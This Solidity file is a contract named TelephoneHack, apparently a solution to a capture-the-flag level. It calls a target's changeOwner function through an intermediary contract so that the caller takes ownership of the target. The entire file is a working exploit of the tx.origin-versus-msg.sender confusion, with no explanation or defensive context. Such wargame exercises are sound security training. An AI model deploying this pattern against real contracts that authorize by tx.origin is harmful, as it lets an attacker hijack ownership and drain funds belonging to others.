// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneHack {
    ITelephone public target;

    constructor(address targetAddress) {
        target = ITelephone(targetAddress);
    }

    function attack() public {
        target.changeOwner(msg.sender);
    }
}
